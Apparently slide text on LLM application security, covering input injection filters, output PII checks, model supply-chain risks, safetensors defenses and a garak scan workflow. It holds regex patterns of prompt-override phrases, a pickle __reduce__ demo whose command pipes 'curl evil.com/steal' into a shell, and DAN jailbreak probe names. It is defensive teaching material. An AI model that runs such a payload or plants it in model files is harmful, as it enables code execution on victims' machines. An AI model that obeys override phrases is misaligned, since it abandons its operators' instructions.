Traditional vs AI Security

Traditional App

  • Deterministic I/O
  • SQL injection, XSS
  • Static analysis works
  • Clear trust boundaries
  • WAF catches patterns

LLM Application

  • Probabilistic I/O
  • Prompt injection, jailbreaks
  • Natural language = infinite attack surface
  • Trust boundaries are blurred
  • WAFs can't parse intent

The Guardrails Pattern

[User Input]
↓
[INPUT GUARD: scan for injection patterns, encoding, role-play]
↓ clean input
[LLM with hardened system prompt]
↓ raw output
[OUTPUT GUARD: check for PII, secrets, harmful content]
↓ safe output
[User Response]

Input Sanitization


import re, base64

INJECTION_PATTERNS = [
    r"ignore\s+(all\s+)?previous\s+instructions",
    r"you\s+are\s+now\s+\w+bot",
    r"system\s*prompt",
    r"IGNORE.*INSTRUCTIONS",
    r"<\/?script>",
]

def scan_input(text: str) -> dict:
    # Check plaintext
    for pattern in INJECTION_PATTERNS:
        if re.search(pattern, text, re.IGNORECASE):
            return {"blocked": True, "reason": pattern}

    # Check for encoded payloads
    try:
        decoded = base64.b64decode(text).decode()
        return scan_input(decoded)  # Recursive check
    except Exception:
        pass

    return {"blocked": False}

Output Validation


import re

PII_PATTERNS = {
    "ssn":    r"\b\d{3}-\d{2}-\d{4}\b",
    "email":  r"\b[\w.-]+@[\w.-]+\.\w+\b",
    "cc":     r"\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b",
    "apikey": r"\b(sk-|pk-|api[_-]?key)[a-zA-Z0-9]{20,}\b",
}

def validate_output(text: str) -> dict:
    findings = []
    for name, pattern in PII_PATTERNS.items():
        if re.search(pattern, text):
            findings.append(name)

    if findings:
        return {"blocked": True, "leaked": findings}
    return {"blocked": False}

Supply Chain: The Hidden Threat


What's Happened

  • 100+ malicious models found on HuggingFace (JFrog, Mar 2024)
  • Pickle evasion via 7z compression bypassed scanners (Feb 2025)
  • Namespace reuse: hijacked model names on Google Vertex & Azure (Unit 42)
  • Slopsquatting: 30K+ downloads of hallucinated "huggingface-cli" package

The Risk

  • Arbitrary code execution on pickle.load()
  • Backdoored model weights
  • AI generates fake package names → attackers register them
  • Deleted HF namespaces can be re-registered by anyone

Pickle: The Danger Zone


import pickle, os

class MaliciousModel:
    def __reduce__(self):
        # This runs when the model is LOADED, not when used
        return (os.system, ("curl evil.com/steal | sh",))

# Attacker saves this as "model.bin"
pickle.dump(MaliciousModel(), open("model.bin", "wb"))

# Victim loads "helpful model" from Hugging Face
model = pickle.load(open("model.bin", "rb"))  # PWNED

Loading a pickle file = arbitrary code execution

Defense: Safetensors + Verification


# 1. Always use safetensors format (no code execution)
from safetensors.torch import load_file
model_weights = load_file("model.safetensors")  # SAFE

# 2. Verify model hash before loading
import hashlib
expected = "a1b2c3d4e5f6..."
actual = hashlib.sha256(open("model.safetensors", "rb").read())
assert actual.hexdigest() == expected, "MODEL TAMPERED"

# 3. Use Hugging Face model signing
from huggingface_hub import model_info
info = model_info("meta-llama/Llama-3-8B")
print(f"Signed: {info.security_repo_status}")

Supply Chain Checklist

1. Use safetensors format—never raw pickle
2. Verify SHA-256 hashes before loading any model
3. Pin model versions—don't pull latest
4. Scan model files: pip install picklescan && picklescan --path model/
5. Run models in sandboxed containers with no network egress
6. Audit Hugging Face model cards and community flags

Putting It All Together: CI/CD


# .github/workflows/llm-security.yml
name: LLM Security Scan

on:
  pull_request:
    paths: ['models/**', 'prompts/**', 'config/**']

jobs:
  garak-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install garak
      - run: |
          garak --model_type rest \
            --model_name ${{ secrets.STAGING_LLM_URL }} \
            --probes dan.Dan_11_0,encoding.InjectBase64 \
            --generations 3
      - uses: actions/upload-artifact@v4
        with:
          name: garak-results
          path: ~/.local/share/garak/runs/
